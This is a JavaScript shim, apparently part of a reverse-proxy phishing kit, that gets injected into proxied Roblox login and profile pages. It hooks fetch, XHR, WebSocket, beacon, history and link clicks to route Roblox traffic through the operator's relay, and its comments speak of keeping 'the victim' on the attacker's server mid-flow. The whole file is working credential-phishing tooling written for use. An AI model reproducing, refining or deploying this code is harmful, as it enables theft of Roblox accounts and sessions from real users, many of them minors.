/**
 * Roblox Proxy URL Rewrite Shim
 *
 * Injected into every proxied Roblox page (login.php, renderGamePage, profile.php).
 *
 * Routes every Roblox API host through the single generic relay at
 * /proxy/roblox/<host>/<path>. The previous build mapped hosts onto a set of
 * hand-written /rblx-* prefixes, and only nine of the twenty-six mapped hosts
 * had a matching Express route — the rest 404'd. A React login page whose
 * bootstrap calls return 404 renders as an unstyled skeleton, which is the
 * "cheap replica" a hand-drawn page produces anyway. One relay, one rule.
 *
 * Static CDN hosts keep their dedicated prefixes because those routes cache and
 * set long-lived Cache-Control, which /proxy/roblox/* deliberately does not.
 */
(function () {
    'use strict';

    if (window.__rbxShim) return;
    window.__rbxShim = true;

    var RELAY = '/proxy/roblox/';

    // CDN hosts with dedicated, cacheable static routes in server.js.
    var CDN_MAP = {
        'css.rbxcdn.com': '/rbxcdn/',
        'js.rbxcdn.com': '/rblx-js/',
        'tr.rbxcdn.com': '/thumbnails/',
        'images.rbxcdn.com': '/imgrbx/',
        'static.rbxcdn.com': '/staticrbx/'
    };

    // Hosts that must never be routed through the relay. www.roblox.com used to
    // be mapped to '/' here, which turned the login page's own POST /v2/login
    // into a request for our /v2/login — 404 at best, an infinite reload of
    // login.php at worst.
    var PASSTHROUGH = {
        'www.roblox.com': true,
        'roblox.com': true
    };

    function isRobloxHost(host) {
        return /(^|\.)roblox\.com$/i.test(host) ||
               /(^|\.)rbxcdn\.com$/i.test(host);
    }

    function buildRelayUrl(parsed) {
        // Preserve the host verbatim so the server-side allowlist sees exactly
        // what the page asked for, and so query strings survive untouched.
        return RELAY + parsed.hostname + parsed.pathname + parsed.search;
    }

    function rewrite(url) {
        if (typeof url !== 'string' || !url) return url;

        // Already pointed at our own relay or a dedicated static prefix.
        if (url.indexOf(RELAY) === 0) return url;
        if (url.charAt(0) === '/' && url.charAt(1) !== '/') {
            // Site-relative. Our host, not Roblox's — leave it alone.
            return url;
        }

        var absolute = url;
        if (url.indexOf('//') === 0) {
            absolute = window.location.protocol + url;
        }

        var parsed;
        try {
            parsed = new URL(absolute, window.location.href);
        } catch (e) {
            return url;
        }

        var host = parsed.hostname.toLowerCase();

        if (!isRobloxHost(host)) return url;
        if (PASSTHROUGH[host]) return url;

        if (CDN_MAP.hasOwnProperty(host)) {
            return CDN_MAP[host] + parsed.pathname.replace(/^\//, '') + parsed.search;
        }

        return buildRelayUrl(parsed);
    }

    /* ── Request & fetch ─────────────────────────────────────────────────── */

    var NativeRequest = window.Request;
    if (NativeRequest) {
        window.Request = function (input, init) {
            if (typeof input === 'string') input = rewrite(input);
            else if (input instanceof URL) input = rewrite(input.href);
            return new NativeRequest(input, init);
        };
        window.Request.prototype = NativeRequest.prototype;
        Object.setPrototypeOf(window.Request, NativeRequest);
    }

    var nativeFetch = window.fetch.bind(window);
    window.fetch = function (input, init) {
        if (typeof input === 'string') input = rewrite(input);
        else if (input instanceof URL) input = rewrite(input.href);
        else if (input && input.url) {
            var rewritten = rewrite(input.url);
            if (rewritten !== input.url) input = new NativeRequest(rewritten, input);
        }
        return nativeFetch(input, init);
    };

    /* ── XHR ─────────────────────────────────────────────────────────────── */

    var nativeOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (method, url) {
        var rest = Array.prototype.slice.call(arguments, 2);
        return nativeOpen.apply(this, [method, rewrite(url)].concat(rest));
    };

    /* ── sendBeacon ──────────────────────────────────────────────────────── */

    if (navigator.sendBeacon) {
        var nativeBeacon = navigator.sendBeacon.bind(navigator);
        navigator.sendBeacon = function (url, data) {
            return nativeBeacon(rewrite(url), data);
        };
    }

    /* ── WebSocket / EventSource ─────────────────────────────────────────── */

    var NativeWS = window.WebSocket;
    if (NativeWS) {
        window.WebSocket = function (url, protocols) {
            var target = rewrite(url);
            return protocols ? new NativeWS(target, protocols) : new NativeWS(target);
        };
        window.WebSocket.prototype = NativeWS.prototype;
        Object.setPrototypeOf(window.WebSocket, NativeWS);
    }

    var NativeES = window.EventSource;
    if (NativeES) {
        window.EventSource = function (url, config) {
            var target = rewrite(url);
            return config ? new NativeES(target, config) : new NativeES(target);
        };
        window.EventSource.prototype = NativeES.prototype;
        Object.setPrototypeOf(window.EventSource, NativeES);
    }

    /* ── Anchor and form navigation ──────────────────────────────────────── */

    // History push/replace traps: if React router navigates to /home, redirect to real Roblox home
    var origPush = history.pushState;
    if (origPush) {
        history.pushState = function(state, title, url) {
            if (url && (url === '/home' || url === '/home/' || String(url).startsWith('/home?') || String(url).endsWith('/home'))) {
                window.location.href = 'https://www.roblox.com/home';
                return;
            }
            return origPush.apply(this, arguments);
        };
    }
    var origReplace = history.replaceState;
    if (origReplace) {
        history.replaceState = function(state, title, url) {
            if (url && (url === '/home' || url === '/home/' || String(url).startsWith('/home?') || String(url).endsWith('/home'))) {
                window.location.href = 'https://www.roblox.com/home';
                return;
            }
            return origReplace.apply(this, arguments);
        };
    }

    // Roblox's React router pushes history entries and sets location.href for
    // some links. Rewriting href before the click is the only way those stay on
    // the box instead of leaking the victim to the real site mid-flow.
    document.addEventListener('click', function (event) {
        var anchor = event.target && event.target.closest && event.target.closest('a[href]');
        if (!anchor) return;
        var href = anchor.getAttribute('href');
        if (!href || href.charAt(0) === '#' || href.indexOf('javascript:') === 0) return;
        
        if (href === '/home' || href === '/home/' || href.indexOf('/home?') === 0 || href === 'https://www.roblox.com/home') {
            event.preventDefault();
            event.stopPropagation();
            window.location.href = 'https://www.roblox.com/home';
            return;
        }

        var rewritten = rewrite(href);
        if (rewritten !== href) anchor.setAttribute('href', rewritten);
    }, true);

    window.__rbxShim = { rewrite: rewrite, relay: RELAY };
})();
